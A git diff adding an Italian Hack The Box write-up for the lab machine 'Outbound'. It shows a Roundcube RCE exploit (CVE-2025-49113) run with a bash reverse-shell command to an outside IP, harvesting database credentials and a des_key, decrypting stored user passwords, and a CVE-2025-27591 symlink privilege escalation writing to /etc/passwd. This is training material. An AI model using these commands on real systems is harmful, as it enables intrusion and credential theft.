@@ -270,5 +270,110 @@ Ci mettiamo in ascolto sulla macchina kali ed inviamo il comando sulla macchina 
   66b08bd127492ddb***************
 
 ################################################################################
+
+# Machine 'Outbound'
+IP: 10.10.11.77
+
+La macchina espone due porte (SSH e HTTP). Visitando il servizio HTTP osserviamo un redirect verso mail.outbound.htb; aggiungiamo quindi questa voce al file /etc/hosts.
+
+Le credenziali per accedere alle mailbox sono disponibili nelle Information di HTB. Effettuato l’accesso, risulta sfruttabile una vulnerabilità in Roundcube (CVE-2025-49113) che consente remote code execution.
+
+  ┌──(kali㉿kali)-[~/CVE-2025-49113-exploit]
+  └─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o****** "bash -c 'bash -i >& /dev/tcp/10.10.14.99/9001 0>&1'"
+  [+] Starting exploit (CVE-2025-49113)...
+  [*] Checking Roundcube version...
+  [*] Detected Roundcube version: 10610
+  [+] Target is vulnerable!
+  [+] Login successful!
+  [*] Exploiting...
+
+
+  ┌──(kali㉿kali)-[~/CVE-2025-49113-exploit]
+  └─$ nc -lvnp 9001
+  listening on [any] 9001 ...
+  connect to [10.10.14.99] from (UNKNOWN) [10.10.11.77] 38002
+  bash: cannot set terminal process group (247): Inappropriate ioctl for device
+  bash: no job control in this shell
+  www-data@mail:/$ 
+
+All’interno di /etc/passwd sono presenti tre utenti: tyler, jacob e mel.
+
+Eseguendo linpeas troviamo credenziali per il database MySQL e la presenza di una des_key necessaria per decifrare i dati di Roundcube:
+
+  $config['db_dsnw'] = 'mysql://roundcube:RCDB*******@localhost/roundcube';
+  $config['imap_host'] = 'localhost:143';
+  $config['smtp_host'] = 'localhost:587';
+  $config['smtp_user'] = '%u';
+  $config['smtp_pass'] = '%p';
+  $config['support_url'] = '';
+  $config['product_name'] = 'Roundcube Webmail';
+  $config['des_key'] = 'rcmail-!24Byt********';
+  $config['plugins'] = [
+  $config['skin'] = 'elastic';
+  $config['default_host'] = 'localhost';
+  $config['smtp_server'] = 'localhost';
+
+Connettendoci al database, nella tabella session troviamo le sessioni cifrate (Base64) che contengono password cifrate per gli utenti:
+ 
+  tyler : d48h5YL/pPzCKGL5mRQptXbiIPWuE1Q7
+  tyler : WB1aA/RnzWmEbyR87eEwRq4mBteBQZMl
+  jacob : L7Rv00ATuwJAr67kITxxcSgnIk25Am/
+
+Avendo la des_key, sfruttiamo la funzione di Roundcube per decriptare le password. Esempio di comando eseguito nella directory di Roundcube:  
   
+  cd /var/www/html/roundcube
+
+  php -r "
+  define('INSTALL_PATH', '/var/www/html/roundcube/'); //Path assoluto 
+  require INSTALL_PATH . 'program/include/clisetup.php'; //Carichiamo il framework di roundcube
+  \$RCMAIL = rcube::get_instance(); // Crea un'istanza di Roundcube
+  echo \$RCMAIL->decrypt('L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'); // Decifra la stringa usando la des_key
+  "
+
+Dalle decifrature otteniamo:
+
+  tyler:LhKL1o9Nm3X2 (password trovata in HTB)
+  jacob:595mO8DmwGeD
+
+Accedendo alla webmail di jacob troviamo due messaggi uno contiene un cambio password -_- che utilizziamo per l’accesso SSH.
+
+  Last login: Mon Jul 14 16:40:57 2025 from 10.10.14.77
+  jacob@outbound:~$ cat user.txt 
+  d993ad08193046868*************
+  jacob@outbound:~$ sudo -l
+  Matching Defaults entries for jacob on outbound:
+      env_reset, mail_badpass,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+      use_pty
+  
+  User jacob may run the following commands on outbound:
+      (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*,
+          !/usr/bin/below --debug*, !/usr/bin/below -d*
+
+jacob può eseguire /usr/bin/below come root senza password. Cercando exploit pubblici troviamo una vulnerabilità di privilege escalation (CVE-2025-27591) relativa a below. 
+Eseguendo lo script di privilege escalation sfruttiamo un log world-writable e un symlink per scrivere su /etc/passwd, ottenendo così una shell root.
+
+  jacob@outbound:~$ python3 privesc.py 
+  [*] Checking for CVE-2025-27591 vulnerability...
+  [+] /var/log/below is world-writable.
+  [!] /var/log/below/error_root.log is a regular file. Removing it...
+  [+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
+  [+] Target is vulnerable.
+  [*] Starting exploitation...
+  [+] Wrote malicious passwd line to /tmp/attacker
+  [+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
+  [*] Executing 'below record' as root to trigger logging...
+  Oct 08 08:25:48.920 DEBG Starting up!
+  Oct 08 08:25:48.920 ERRO 
+  ----------------- Detected unclean exit ---------------------
+  Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01759881600: EAGAIN: Try again
+  -------------------------------------------------------------
+  [+] 'below record' executed.
+  [*] Appending payload into /etc/passwd via symlink...
+  [+] Payload appended successfully.
+  [*] Attempting to switch to root shell via 'su attacker'...
+  root@outbound:/home/jacob# cd
+  root@outbound:~# cat root.txt 
+  5a82aab4b944ec950***************
+
 
